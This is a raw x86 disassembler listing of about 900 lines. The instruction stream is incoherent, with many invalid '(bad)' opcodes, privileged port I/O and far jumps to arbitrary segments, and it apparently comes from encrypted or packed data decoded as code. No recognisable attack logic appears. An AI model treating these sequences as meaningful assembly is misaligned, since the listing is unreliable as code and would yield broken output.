  4167a2:	cs mov ebp,0x2b372a2c
  4167a8:	sbb    DWORD PTR [eax],edi
  4167aa:	or     BYTE PTR [ecx-0x7f],al
  4167ad:	or     bh,BYTE PTR [edi-0x13]
  4167b0:	xchg   edx,eax
  4167b1:	xor    cl,bl
  4167b3:	mov    ebx,0xf538b2c6
  4167b8:	stc    
  4167b9:	adc    eax,0x7a8182f3
  4167be:	push   edx
  4167bf:	mov    esi,0x9c69d921
  4167c4:	je     0x41680a
  4167c6:	shl    DWORD PTR [edi+eax*4],cl
  4167c9:	xchg   esi,eax
  4167ca:	fdiv   DWORD PTR [ebx]
  4167cc:	add    eax,0xa58d6098
  4167d1:	or     eax,0xe1057692
  4167d6:	ds pop ebx
  4167d8:	ja     0x41675a
  4167da:	dec    edi
  4167db:	mov    dh,0x87
  4167dd:	ret    0x4287
  4167e0:	mov    cl,0x8f
  4167e2:	addr16 pop ss
  4167e4:	outs   dx,BYTE PTR ds:[esi]
  4167e5:	jno    0x416788
  4167e7:	scas   al,BYTE PTR es:[edi]
  4167e8:	mov    BYTE PTR [ecx-0x7e3490c8],dl
  4167ee:	cld    
  4167ef:	or     dh,BYTE PTR [esp+edx*4-0x1f0d6d67]
  4167f6:	inc    edi
  4167f7:	pop    ecx
  4167f8:	and    al,0x3f
  4167fa:	out    dx,al
  4167fb:	dec    ecx
  4167fc:	int3   
  4167fd:	mov    cl,al
  4167ff:	je     0x4167e4
  416801:	or     BYTE PTR [esi+ebx*4],0xdf
  416805:	xchg   edi,eax
  416806:	add    DWORD PTR [edx],edx
  416808:	pop    ss
  416809:	pop    es
  41680a:	pop    es
  41680b:	fiadd  DWORD PTR [edx+0x4e6b0fb8]
  416811:	mov    WORD PTR [esi],fs
  416813:	add    BYTE PTR [ecx+0x5fd68c07],bh
  416819:	retf   
  41681a:	xor    ebp,esi
  41681c:	xchg   esp,eax
  41681d:	stos   DWORD PTR es:[edi],eax
  41681e:	outs   dx,DWORD PTR ds:[esi]
  41681f:	mov    al,ds:0x5cfb4017
  416824:	loopne 0x4167d4
  416826:	fwait
  416827:	xchg   ebx,eax
  416828:	mov    dl,0x7d
  41682a:	jle    0x416871
  41682c:	sbb    eax,0xf16bb1e5
  416831:	xchg   edi,eax
  416832:	push   cs
  416833:	addr16 mov ss:0xb46,al
  416838:	or     ebp,DWORD PTR [eax]
  41683a:	lods   al,BYTE PTR ds:[esi]
  41683b:	ds jb  0x4167d4
  41683e:	into   
  41683f:	pop    edx
  416840:	fadd   QWORD PTR [ebp+0x13]
  416843:	fnstcw WORD PTR [edx+0x59]
  416846:	imul   ebx,DWORD PTR [eax+0x7a],0x6142065b
  41684d:	nop
  41684e:	outs   dx,BYTE PTR ds:[esi]
  41684f:	and    dh,cl
  416851:	sub    al,dh
  416853:	xor    al,0xe1
  416855:	pop    edx
  416856:	push   0xffe51fe6
  41685b:	mov    ds:0x56114e98,eax
  416860:	ficom  DWORD PTR ds:0x7f9c94e6
  416866:	adc    eax,0x8e8d416a
  41686b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41686c:	lods   al,BYTE PTR ds:[esi]
  41686d:	js     0x416849
  41686f:	or     esi,DWORD PTR [edi-0x53]
  416872:	jbe    0x416899
  416874:	and    eax,0x95ea4338
  416879:	xor    eax,0x97818cbb
  41687e:	sub    eax,0x2c288a6a
  416883:	outs   dx,DWORD PTR ds:[esi]
  416884:	push   esi
  416885:	adc    eax,0x5980b7d6
  41688a:	scas   eax,DWORD PTR es:[edi]
  41688b:	xor    eax,0x80f280a7
  416890:	std    
  416891:	pop    ds
  416892:	stos   DWORD PTR es:[edi],eax
  416893:	inc    edi
  416894:	and    BYTE PTR [edx],bh
  416896:	enter  0x807e,0x1d
  41689a:	imul   ebx,DWORD PTR [edx+0x1877ad42],0x711c35f6
  4168a4:	test   eax,0xc4e0d4e1
  4168a9:	mov    al,0xda
  4168ab:	int    0x8a
  4168ad:	rcl    DWORD PTR ds:0x93794e3b,0x4
  4168b4:	out    0x90,eax
  4168b6:	nop
  4168b7:	sub    DWORD PTR [esi],0xd91620e5
  4168bd:	repz or DWORD PTR [ecx+0x21fb93ae],esi
  4168c4:	inc    ecx
  4168c5:	vpavgw xmm1,xmm4,XMMWORD PTR [edi+edi*4-0x38357b9c]
  4168ce:	add    bl,ah
  4168d0:	mov    ch,ch
  4168d2:	xlat   BYTE PTR ds:[ebx]
  4168d3:	cli    
  4168d4:	mov    eax,ds:0x6b5dc807
  4168d9:	inc    edx
  4168da:	ja     0x41690b
  4168dc:	xchg   ecx,eax
  4168dd:	fidivr DWORD PTR [ebx+0xe]
  4168e0:	cmp    al,dh
  4168e2:	or     esp,DWORD PTR [ebx+0x68]
  4168e5:	imul   eax,DWORD PTR [ebx+ebp*8-0x32105249],0xd6915446
  4168f0:	mov    bl,0x95
  4168f2:	push   ds
  4168f3:	popf   
  4168f4:	call   0xfd8a:0x9af1d26b
  4168fb:	dec    esp
  4168fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168fd:	rcr    BYTE PTR [eax+ebx*4-0x6145ea92],1
  416904:	adc    esi,DWORD PTR [eax+eax*1-0x13a00302]
  41690b:	sub    esp,esi
  41690d:	out    0xa9,al
  41690f:	ss mov dh,0x70
  416912:	call   0x4f20:0xa53c8810
  416919:	pop    ebp
  41691a:	jae    0x416968
  41691c:	int    0xed
  41691e:	jecxz  0x4168ac
  416920:	retf   
  416921:	jae    0x416944
  416923:	adc    DWORD PTR [ebp+0x3bde4c00],edi
  416929:	adc    ch,cl
  41692b:	xor    al,0x86
  41692d:	pusha  
  41692e:	dec    edi
  41692f:	enter  0x5eae,0x1d
  416933:	mov    bh,0x56
  416935:	aaa    
  416936:	cld    
  416937:	mov    edi,0xeb43f17b
  41693c:	addr16 dec esi
  41693e:	pop    DWORD PTR [esi]
  416940:	mov    bh,BYTE PTR [ebx-0x45f4d287]
  416946:	adc    ah,BYTE PTR [esi-0x2e10b67b]
  41694c:	xchg   BYTE PTR [edx+edx*2-0x2fa6d9fe],bh
  416953:	adc    al,0x68
  416955:	les    eax,FWORD PTR [ebx+eiz*1+0x4818146c]
  41695c:	sbb    DWORD PTR [esi-0x80],edx
  41695f:	sbb    eax,0xf0c78977
  416964:	and    al,0x44
  416966:	jns    0x4169a3
  416968:	jnp    0x416965
  41696a:	mov    edi,0x5485365d
  41696f:	inc    edi
  416970:	mov    BYTE PTR [edi],al
  416972:	dec    edi
  416973:	dec    ebx
  416974:	hlt    
  416975:	and    BYTE PTR [ebx-0x7241265e],dl
  41697b:	xor    ecx,DWORD PTR [esi+0x5d]
  41697e:	push   0xe9cb87cc
  416983:	fild   WORD PTR [edx]
  416985:	add    BYTE PTR [eax],al
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	cwde   
  416994:	repz pop ds
  416996:	and    DWORD PTR [ebp-0x468f80e1],esp
  41699c:	jle    0x416a0e
  41699e:	jo     0x416a1f
  4169a0:	and    eax,0x83e3c06b
  4169a5:	std    
  4169a6:	fwait
  4169a7:	push   0x6f13a225
  4169ac:	enter  0x1ec4,0x78
  4169b0:	push   edi
  4169b1:	mov    ecx,0xb5412680
  4169b6:	popf   
  4169b7:	ds sti 
  4169b9:	push   esi
  4169ba:	nop
  4169bb:	inc    ecx
  4169bc:	add    eax,0x9f4ea95
  4169c1:	fcmovbe st,st(4)
  4169c3:	bound  ebp,QWORD PTR [eax]
  4169c5:	mov    dh,BYTE PTR [ebx]
  4169c7:	jno    0x4169c4
  4169c9:	mov    bl,0xe7
  4169cb:	add    ah,bl
  4169cd:	into   
  4169ce:	and    eax,0xd90393ba
  4169d3:	jg     0x4169a8
  4169d5:	add    esi,DWORD PTR [ebp+0x50]
  4169d8:	xchg   ebp,eax
  4169d9:	data16 jne 0x4169fe
  4169dc:	jno    0x416a0a
  4169de:	lods   al,BYTE PTR ds:[esi]
  4169df:	(bad)  
  4169e0:	mov    ds:0xf9fd79b7,al
  4169e5:	cmp    ecx,DWORD PTR [edx]
  4169e7:	loop   0x4169a5
  4169e9:	jb     0x4169b7
  4169eb:	int    0xdf
  4169ed:	fild   WORD PTR [ebx]
  4169ef:	in     al,dx
  4169f0:	jnp    0x4169c2
  4169f2:	cmp    bh,BYTE PTR [edx]
  4169f4:	lds    ecx,FWORD PTR [ecx-0x7e]
  4169f7:	mov    bl,0x6d
  4169f9:	pushf  
  4169fa:	scas   eax,DWORD PTR es:[edi]
  4169fb:	es pop es
  4169fd:	mov    dl,bl
  4169ff:	addr16 xor eax,0x80c7c95d
  416a05:	out    0xeb,al
  416a07:	icebp  
  416a08:	mov    DWORD PTR [esi-0x666594fe],ebx
  416a0e:	clc    
  416a0f:	fwait
  416a10:	xchg   esp,eax
  416a11:	adc    dh,ch
  416a13:	jnp    0x4169f8
  416a15:	call   0xc20f9720
  416a1a:	xchg   di,ax
  416a1c:	gs fmulp st(4),st
  416a1f:	jne    0x416a53
  416a21:	(bad)
  416a25:	adc    al,0xc0
  416a27:	jg     0x416a0f
  416a29:	imul   BYTE PTR [ebx+0x34847e71]
  416a2f:	xchg   ebp,eax
  416a30:	pop    es
  416a31:	in     eax,dx
  416a32:	pop    es
  416a33:	adc    eax,0x2b7f9355
  416a38:	loope  0x416a3e
  416a3a:	sbb    al,0x92
  416a3c:	dec    DWORD PTR [ecx]
  416a3e:	addr16 xchg eax,ebp
  416a41:	loope  0x4169f6
  416a43:	out    dx,eax
  416a44:	jno    0x416a26
  416a46:	fist   WORD PTR [eax+0x1d]
  416a49:	xor    DWORD PTR [edi+0x6d],ecx
  416a4c:	mov    ds:0xe83abf21,eax
  416a51:	add    ah,BYTE PTR [esi]
  416a53:	lahf   
  416a54:	and    DWORD PTR [ebp+0x41],edx
  416a57:	sub    eax,0x7172ac29
  416a5c:	dec    DWORD PTR [ebx-0x2a47d3be]
  416a62:	pop    esp
  416a63:	lods   al,BYTE PTR es:[esi]
  416a65:	xchg   esp,eax
  416a66:	icebp  
  416a67:	arpl   bx,bx
  416a69:	leave  
  416a6a:	aas    
  416a6b:	jnp    0x416a69
  416a6d:	pop    edx
  416a6e:	xor    BYTE PTR [ecx+edi*8+0x6d352bdc],dl
  416a75:	mov    DWORD PTR [esi-0x4a81687a],esi
  416a7b:	call   0x4244:0xfbaee3c6
  416a82:	sbb    eax,0xf285e960
  416a87:	ja     0x416a97
  416a89:	sub    edx,DWORD PTR [edx-0x4c583df0]
  416a8f:	adc    eax,0xaa9b52b1
  416a94:	lods   al,BYTE PTR ds:[esi]
  416a95:	xor    edi,ecx
  416a97:	xor    bh,0x58
  416a9a:	jl     0x416ac3
  416a9c:	adc    al,0x99
  416a9e:	mov    al,0xcb
  416aa0:	mov    ?,WORD PTR [edi]
  416aa2:	mov    dl,0x19
  416aa4:	ror    DWORD PTR cs:[ecx],cl
  416aa7:	das    
  416aa8:	int3   
  416aa9:	cdq    
  416aaa:	ins    BYTE PTR es:[edi],dx
  416aab:	test   BYTE PTR [ecx],dl
  416aad:	jns    0x416a63
  416aaf:	dec    edi
  416ab0:	lods   eax,DWORD PTR ds:[esi]
  416ab1:	lock xchg BYTE PTR [edi],cl
  416ab4:	lahf   
  416ab5:	xor    BYTE PTR [edx-0x17],cl
  416ab8:	dec    ebx
  416ab9:	les    esi,FWORD PTR [ebp+ecx*2+0x1d702476]
  416ac0:	stos   BYTE PTR es:[edi],al
  416ac1:	(bad)  
  416ac2:	sti    
  416ac3:	nop
  416ac4:	cmc    
  416ac5:	mov    ?,WORD PTR [edx+0x2707a244]
  416acb:	or     al,0xa5
  416acd:	ins    BYTE PTR es:[edi],dx
  416ace:	jae    0x416b3a
  416ad0:	cmp    eax,0x5bc3556f
  416ad5:	jae    0x416aae
  416ad7:	jl     0x416b0a
  416ad9:	adc    esp,DWORD PTR [ecx-0x61]
  416adc:	pop    ds
  416add:	outs   dx,DWORD PTR ds:[esi]
  416ade:	push   esp
  416adf:	addr16 mov al,ds:0x4442
  416ae3:	rol    DWORD PTR [ebx+ebx*8+0xf45a8ab],1
  416aea:	cmp    al,0xd
  416aec:	pop    ss
  416aed:	sub    BYTE PTR [edx],ah
  416aef:	inc    ecx
  416af0:	xchg   esi,eax
  416af1:	pop    edi
  416af2:	cwde   
  416af3:	pusha  
  416af4:	push   ebp
  416af5:	std    
  416af6:	ss ins BYTE PTR es:[edi],dx
  416af8:	xor    bl,ch
  416afa:	push   esp
  416afb:	adc    ah,BYTE PTR [esi]
  416afd:	sub    al,0xf8
  416aff:	ja     0x416a9d
  416b01:	test   cl,cl
  416b03:	scas   eax,DWORD PTR es:[edi]
  416b04:	loope  0x416b30
  416b06:	dec    eax
  416b07:	cld    
  416b08:	or     bh,ch
  416b0a:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  416b0c:	pusha  
  416b0d:	test   DWORD PTR [ebx],eax
  416b0f:	push   esi
  416b10:	adc    BYTE PTR [edi],dl
  416b12:	push   0x8554eaa1
  416b17:	ins    BYTE PTR es:[edi],dx
  416b18:	sbb    al,0xc6
  416b1a:	std    
  416b1b:	push   0x25
  416b1d:	mov    dl,0xe0
  416b1f:	xchg   ecx,eax
  416b20:	pop    edx
  416b21:	lods   eax,DWORD PTR ds:[esi]
  416b22:	ins    BYTE PTR es:[edi],dx
  416b23:	sub    BYTE PTR [edi+esi*4+0x13850d6e],ch
  416b2a:	cld    
  416b2b:	pop    esp
  416b2c:	jnp    0x416ba9
  416b2e:	dec    ecx
  416b2f:	jno    0x416b6f
  416b31:	and    esp,DWORD PTR [eax]
  416b33:	mov    ds:0x9934309a,al
  416b38:	into   
  416b39:	inc    ebp
  416b3a:	push   ss
  416b3b:	repnz adc ah,BYTE PTR [edx+eax*8-0x21]
  416b40:	stos   DWORD PTR es:[edi],eax
  416b41:	xchg   esp,eax
  416b42:	sub    BYTE PTR [esi+0x5c],0x12
  416b46:	mov    al,ds:0x665e3459
  416b4b:	push   es
  416b4c:	fs ss sbb dh,al
  416b50:	push   ebx
  416b51:	mov    WORD PTR [ebx],?
  416b53:	jge    0x416b28
  416b55:	xchg   BYTE PTR [eax-0x2e],al
  416b58:	clc    
  416b59:	cmp    ax,WORD PTR [ebx+0xcb627f1]
  416b60:	(bad)  
  416b61:	fdivp  st(4),st
  416b63:	xor    DWORD PTR [edi-0x6d3ec502],ecx
  416b69:	into   
  416b6a:	jb     0x416b27
  416b6c:	sahf   
  416b6d:	sbb    BYTE PTR [ecx-0x7b73d181],dh
  416b73:	hlt    
  416b74:	mov    edx,0xe1340218
  416b79:	into   
  416b7a:	mov    bl,BYTE PTR [edx+0x7c2fb1ec]
  416b80:	ror    ebx,1
  416b82:	or     esp,ebx
  416b84:	add    esi,DWORD PTR [edx+0x459a0bb]
  416b8a:	vhsubps ymm6,ymm6,YMMWORD PTR [ecx-0x2f357059]
  416b92:	xor    BYTE PTR [ecx+ebx*1+0x3ee84ec4],ch
  416b99:	add    al,0x36
  416b9b:	ja     0x416ba0
  416b9d:	pop    es
  416b9e:	pushf  
  416b9f:	mov    al,ds:0x453c5c0f
  416ba4:	leave  
  416ba5:	in     eax,dx
  416ba6:	stos   BYTE PTR es:[edi],al
  416ba7:	push   ebp
  416ba8:	add    eax,0x24552639
  416bad:	pusha  
  416bae:	or     cl,ch
  416bb0:	mov    ah,0x39
  416bb2:	mov    BYTE PTR [ebx],bl
  416bb4:	push   edi
  416bb5:	cmp    cl,dh
  416bb7:	or     ah,dl
  416bb9:	es ret 0x6f82
  416bbd:	or     edi,eax
  416bbf:	rcl    DWORD PTR [eax+ebx*2-0x78eb616a],0x88
  416bc7:	lds    eax,FWORD PTR [edi+0x353e62a0]
  416bcd:	and    BYTE PTR [ecx],cl
  416bcf:	fwait
  416bd0:	dec    edi
  416bd1:	iret   
  416bd2:	jge    0x416bbe
  416bd4:	loopne 0x416b9e
  416bd6:	mov    ecx,0xabdb8227
  416bdb:	js     0x416bf2
  416bdd:	inc    edi
  416bde:	ds jmp 0x416c39
  416be1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416be2:	test   al,0x4e
  416be4:	add    BYTE PTR [ebx+0x52],ch
  416be7:	sub    DWORD PTR [edx-0x789f2fb9],edi
  416bed:	gs cld 
  416bef:	pop    esp
  416bf0:	mov    dh,0xc9
  416bf2:	rol    BYTE PTR [edx-0x2f],0x86
  416bf6:	popa   
  416bf7:	cmp    edx,DWORD PTR [ecx+0x24a165f2]
  416bfd:	jno    0x416b9e
  416bff:	ficom  WORD PTR [esi-0x2be69f78]
  416c05:	lea    eax,[ebx-0x72]
  416c08:	ins    BYTE PTR es:[edi],dx
  416c09:	inc    esi
  416c0a:	loop   0x416c08
  416c0c:	fwait
  416c0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c0e:	mov    ebp,0xcd5cb0be
  416c13:	test   al,0xad
  416c15:	(bad)  
  416c16:	std    
  416c17:	adc    DWORD PTR ss:[eax+0x17],edi
  416c1b:	sbb    ah,BYTE PTR [esi]
  416c1d:	xor    esi,ebx
  416c1f:	and    al,cl
  416c21:	xchg   bl,al
  416c23:	sub    cl,BYTE PTR [esi+0x6e]
  416c26:	sahf   
  416c27:	mov    dl,0xda
  416c29:	loopne 0x416be5
  416c2b:	sub    DWORD PTR [ebx+ebx*8],esi
  416c2e:	icebp  
  416c2f:	sub    BYTE PTR [edi+0x5887d005],0x72
  416c36:	in     eax,dx
  416c37:	push   ds
  416c38:	and    al,0xce
  416c3a:	mov    dh,BYTE PTR ss:[ecx+edx*1-0x49]
  416c3f:	jb     0x416c5d
  416c41:	mov    ebp,0xaac50e23
  416c46:	jp     0x416c91
  416c48:	retf   
  416c49:	ss push 0x7b
  416c4c:	jp     0x416be3
  416c4e:	and    BYTE PTR [ebx],0x1a
  416c51:	gs push ebp
  416c53:	outs   dx,DWORD PTR ds:[esi]
  416c54:	int    0x57
  416c56:	mov    al,0x12
  416c58:	and    eax,0xdcd220e7
  416c5d:	jge    0x416cb9
  416c5f:	jb     0x416c95
  416c61:	cmp    al,0x18
  416c63:	ror    dl,1
  416c65:	js     0x416cb0
  416c67:	mov    eax,DWORD PTR [ebp-0x1c]
  416c6a:	jmp    0x416f4e
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	outs   dx,DWORD PTR ds:[esi]
  416c7c:	xor    BYTE PTR [edi+0x4a],ch
  416c7f:	out    dx,al
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416ca2
  416c88:	and    ch,BYTE PTR [ecx]
  416c8a:	jp     0x416c0c
  416c8c:	or     cl,BYTE PTR [eax+0x6f01fb62]
  416c92:	cmc    
  416c93:	fs sahf 
  416c95:	popa   
  416c96:	aad    0x2b
  416c98:	mov    eax,ds:0x6321c6df
  416c9d:	jmp    0xbb7a:0x3e48c8dc
  416ca4:	mov    cl,0x8e
  416ca6:	cmp    eax,0x2fc54577
  416cab:	inc    eax
  416cac:	ins    DWORD PTR es:[edi],dx
  416cad:	pushf  
  416cae:	jno    0x416ccb
  416cb0:	pusha  
  416cb1:	sub    esp,ebp
  416cb3:	sub    al,0x7
  416cb5:	mov    ebx,eax
  416cb7:	mov    bh,0xc8
  416cb9:	or     BYTE PTR [ecx+0x6],dh
  416cbc:	mov    eax,0x1e52abec
  416cc1:	les    edx,FWORD PTR [ebp+0x51fa1610]
  416cc7:	or     al,0x87
  416cc9:	in     al,0xc0
  416ccb:	pop    esi
  416ccc:	sub    ebp,DWORD PTR [ecx]
  416cce:	nop
  416ccf:	jmp    0x89327bf4
  416cd4:	sbb    eax,0xea8d33a9
  416cd9:	rcr    DWORD PTR [esi-0x36],cl
  416cdc:	jl     0x416cd3
  416cde:	push   edx
  416cdf:	test   al,0x20
  416ce1:	jp     0x416c64
  416ce3:	xchg   ebx,eax
  416ce4:	mov    esi,0xd041ab91
  416ce9:	inc    eax
  416cea:	sbb    DWORD PTR [ecx],esi
  416cec:	popa   
  416ced:	add    al,0x11
  416cef:	jge    0x416c72
  416cf1:	stos   BYTE PTR es:[edi],al
  416cf2:	arpl   ax,sp
  416cf4:	cli    
  416cf5:	push   ds
  416cf6:	jmp    0x416d35
  416cf8:	fbstp  TBYTE PTR [eax+eax*1-0x46]
  416cfc:	xor    eax,0x225c2330
  416d01:	jle    0x416cac
  416d03:	inc    eax
  416d04:	and    al,0xe8
  416d06:	daa    
  416d07:	ja     0x416cd5
  416d09:	sub    eax,0xa8a93fd1
  416d0e:	inc    ebx
  416d0f:	shr    BYTE PTR [ebx-0x4553241c],cl
  416d15:	sahf   
  416d16:	adc    al,BYTE PTR [ecx+0x3b]
  416d19:	add    ebp,DWORD PTR [eax-0x19e5ed42]
  416d1f:	pop    ebp
  416d20:	sbb    esi,DWORD PTR [ecx-0x135b95c1]
  416d26:	mov    ebp,0x9c051d92
  416d2b:	imul   esi,DWORD PTR [ebx-0x40b60917],0x65
  416d32:	sbb    al,0x53
  416d34:	add    al,0xbe
  416d36:	xchg   edi,eax
  416d37:	or     eax,0xf7661521
  416d3c:	dec    ebx
  416d3d:	shr    BYTE PTR [ebp-0x7d],cl
  416d40:	push   esp
  416d41:	dec    edx
  416d42:	bound  esp,QWORD PTR [ebx-0x26678ee0]
  416d48:	inc    ecx
  416d49:	pminsw mm3,QWORD PTR [eax]
  416d4c:	mov    WORD PTR ds:0xffd93f2d,fs
  416d52:	xchg   esi,eax
  416d53:	mov    esp,0x3aae6680
  416d58:	dec    esi
  416d59:	sub    ch,dl
  416d5b:	push   0xffffffa7
  416d5d:	out    0x36,eax
  416d5f:	sbb    DWORD PTR [eax],0x33
  416d62:	mov    ebx,0x2d366ac
  416d67:	arpl   WORD PTR [esp+ebx*8+0x25f8bc35],ax
  416d6e:	jmp    0xef42:0x1a603ab1
  416d75:	jo     0x416d41
  416d77:	push   ds
  416d78:	das    
  416d79:	inc    ebp
  416d7a:	loope  0x416d9b
  416d7c:	jnp    0x416dbd
  416d7e:	ins    DWORD PTR es:[edi],dx
  416d7f:	adc    eax,0x45d070b6
  416d84:	cmp    ch,BYTE PTR [ebx]
  416d86:	in     al,0x71
  416d88:	sar    BYTE PTR [esi],0xc4
  416d8b:	jmp    0x668beb61
  416d90:	ss out dx,eax
  416d92:	mov    BYTE PTR [ebp-0x44625f6],cl
  416d98:	xor    ecx,0xf7fb3609
  416d9e:	xchg   edx,eax
  416d9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416da0:	in     al,0xe5
  416da2:	out    0x1b,eax
  416da4:	push   esi
  416da5:	pushf  
  416da6:	xchg   ebp,eax
  416da7:	jo     0x416d81
  416da9:	aam    0xc0
  416dab:	mov    ebp,0x33c5880b
  416db0:	fdivrp st(4),st
  416db2:	ret    0xe3b6
  416db5:	jne    0x416e16
  416db7:	hlt    
  416db8:	sahf   
  416db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dba:	pop    es
  416dbb:	sbb    eax,0x2f93674c
  416dc0:	mov    edi,0xb2b1ccf1
  416dc5:	xor    BYTE PTR [esi*8+0x72ebacee],dl
  416dcc:	and    ebx,DWORD PTR [esi-0x1f]
  416dcf:	test   dh,al
  416dd1:	xchg   edx,eax
  416dd2:	pop    ebp
  416dd3:	(bad)  
  416dd4:	jns    0x416dfd
  416dd6:	xor    al,0x9f
  416dd8:	push   DWORD PTR [edi]
  416dda:	outs   dx,DWORD PTR ds:[esi]
  416ddb:	lock js 0x416dc9
  416dde:	and    DWORD PTR [edi],esi
  416de0:	jmp    0x416d8c
  416de2:	mov    al,0xe5
  416de4:	scas   al,BYTE PTR es:[edi]
  416de5:	fwait
  416de6:	jg     0x416d89
  416de8:	ret    0xdb99
  416deb:	retf   
  416dec:	cmp    al,0x12
  416dee:	cdq    
  416def:	leave  
  416df0:	(bad)  
  416df1:	push   cs
  416df2:	ja     0x416dc3
  416df4:	mov    eax,0x5e029ce2
  416df9:	sub    DWORD PTR [edi],esp
  416dfb:	iret   
  416dfc:	mov    cl,0xa5
  416dfe:	lds    eax,FWORD PTR [esi+ebx*2-0x74b639df]
  416e05:	dec    ecx
  416e06:	jl     0x416e25
  416e08:	sub    dh,BYTE PTR [edx-0x2ee98fff]
  416e0e:	mov    al,0x6d
  416e10:	sub    eax,eax
  416e12:	push   edx
  416e13:	loop   0x416e0a
  416e15:	inc    ecx
  416e16:	hlt    
  416e17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e18:	int3   
  416e19:	dec    esp
  416e1a:	pop    ss
  416e1b:	loope  0x416e24
  416e1d:	icebp  
  416e1e:	jns    0x416e69
  416e20:	out    dx,al
  416e21:	sar    bl,0x69
  416e24:	cwde   
  416e25:	in     eax,dx
  416e26:	ret    0x4379
  416e29:	sahf   
  416e2a:	imul   edx,DWORD PTR [eax-0x9],0xfffffff6
  416e2e:	jae    0x416e7b
  416e30:	jb     0x416df6
  416e32:	xor    al,0x4
  416e34:	aaa    
  416e35:	mov    eax,0x3016b57e
  416e3a:	or     ah,BYTE PTR [edi+0x3]
  416e3d:	jmp    0x24f03e77
  416e42:	dec    ebp
  416e43:	(bad)  
  416e44:	sub    al,0x9c
  416e46:	pop    esi
  416e47:	das    
  416e48:	enter  0xcc33,0x94
  416e4c:	xlat   BYTE PTR ds:[ebx]
  416e4d:	push   es
  416e4e:	sbb    esp,edi
  416e50:	dec    BYTE PTR [eax-0x28]
  416e53:	loop   0x416e0a
  416e55:	mov    ebp,0x57957d14
  416e5a:	push   ss
  416e5b:	mov    dl,0x8a
  416e5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e5e:	mov    eax,eax
  416e60:	aad    0x2b
  416e62:	or     DWORD PTR [eax-0x4147ce23],eax
  416e68:	mov    cl,0xf1
  416e6a:	dec    ebx
  416e6b:	sub    ecx,DWORD PTR [ecx]
  416e6d:	mov    ch,0xe7
  416e6f:	out    0xe8,al
  416e71:	pop    esp
  416e72:	inc    edi
  416e73:	push   eax
  416e74:	jb     0x416e87
  416e76:	sub    BYTE PTR [edi],ah
  416e78:	mov    ds:0x2cb18254,eax
  416e7d:	add    eax,0x19c5f7c2
  416e82:	xor    BYTE PTR [edi],bl
  416e84:	xchg   ebp,eax
  416e85:	bound  esp,QWORD PTR [ebx]
  416e87:	sbb    dh,BYTE PTR [ebx+eiz*8]
  416e8a:	dec    ecx
  416e8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e8c:	mov    edi,0x6e00968d
  416e91:	or     dl,BYTE PTR [eax]
  416e93:	lds    ebp,FWORD PTR [edi-0x79cedea3]
  416e99:	pop    esi
  416e9a:	and    DWORD PTR [esi],esi
  416e9c:	fiadd  WORD PTR [ebx+eiz*8+0x1c]
  416ea0:	(bad)  
  416ea2:	sub    al,dh
  416ea4:	mov    dl,0xa
  416ea6:	sti    
  416ea7:	dec    esi
  416ea8:	sbb    BYTE PTR [edi-0x1f],ah
  416eab:	pop    eax
  416eac:	or     eax,0xd2f69e70
  416eb1:	mov    ebx,0x37bd381f
  416eb6:	mov    dl,0x6b
  416eb8:	rcl    DWORD PTR [edi],1
  416eba:	mov    al,BYTE PTR [ebx-0x49064df2]
  416ec0:	and    esp,DWORD PTR [eax-0x6c]
  416ec3:	push   ecx
  416ec4:	test   al,0x98
  416ec6:	add    ebx,DWORD PTR [esp+ebx*1-0x75]
  416eca:	push   esi
  416ecb:	jecxz  0x416f3f
  416ecd:	inc    esi
  416ece:	bound  ecx,QWORD PTR [edx+0x230e3b7c]
  416ed4:	idiv   BYTE PTR [edi-0x11c9df31]
  416eda:	aam    0x55
  416edc:	push   esi
  416edd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ede:	adc    DWORD PTR [esi-0x3a],ebx
  416ee1:	dec    eax
  416ee2:	sahf   
  416ee3:	ss jno 0x416f19
  416ee6:	or     esp,esi
  416ee8:	fistp  QWORD PTR [esi-0x59919aee]
  416eee:	mov    bl,0x58
  416ef0:	data16 sti 
  416ef2:	push   esp
  416ef3:	xor    dh,0xb3
  416ef6:	inc    ebp
  416ef7:	inc    eax
  416ef8:	stos   DWORD PTR es:[edi],eax
  416ef9:	ss popf 
  416efb:	inc    esp
  416efc:	int3   
  416efd:	add    DWORD PTR [ebx+eax*1-0x4],0xb756259c
  416f05:	div    edi
  416f07:	daa    
  416f08:	pop    ds
  416f09:	add    eax,0x9fbeb80
  416f0e:	das    
  416f0f:	xchg   esp,eax
  416f10:	out    0x52,al
  416f12:	cld    
  416f13:	lods   eax,DWORD PTR ds:[esi]
  416f14:	mov    dh,0xe6
  416f16:	or     al,0x82
  416f18:	dec    eax
  416f19:	mov    ch,0x52
  416f1b:	jno    0x416f49
  416f1d:	dec    esi
  416f1e:	outs   dx,BYTE PTR ds:[esi]
  416f1f:	jbe    0x416f7c
  416f21:	sar    BYTE PTR [ecx],1
  416f23:	push   ebp
  416f24:	or     eax,0xaada3881
  416f29:	mov    WORD PTR [esi+eax*8+0x55753eea],ss
  416f30:	cli    
  416f31:	xor    ebx,DWORD PTR [ebp*4+0x6235c2b4]
  416f38:	mov    eax,ds:0x2a50411e
  416f3d:	fadd   DWORD PTR [eax-0x656c25be]
  416f43:	push   edx
  416f44:	scas   al,BYTE PTR es:[edi]
  416f45:	dec    esp
  416f46:	fcomp  DWORD PTR [esi+0x35]
  416f49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f4a:	iret   
